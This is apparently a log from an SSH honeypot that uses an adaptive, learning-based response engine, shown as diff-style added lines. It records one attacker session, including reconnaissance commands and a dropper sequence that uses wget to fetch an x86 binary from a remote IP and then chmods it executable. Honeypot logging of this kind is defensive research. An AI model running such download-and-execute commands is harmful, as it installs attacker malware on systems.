+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: cat /bin/echo  
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: cat /bin/echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] /bin/echo resolved into /bin/echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: cd / 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: cd / 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] start to get action .. 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start cd 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ cd 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] saving the case ... 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.1          0.1         95.39978332] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus  
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start wget 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ wget 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09565383          0.3459876         0.0985675] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: chmod 777 usb_bus  
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: chmod 777 usb_bus 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] start to get action .. 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start chmod 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ chmod 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09565383          0.3459876         0.0985675] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] saving the case ... 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09565383          0.3459876         0.0985675] 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] Got remote error, code 11 
+	reason: disconnected by user 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] connection lost
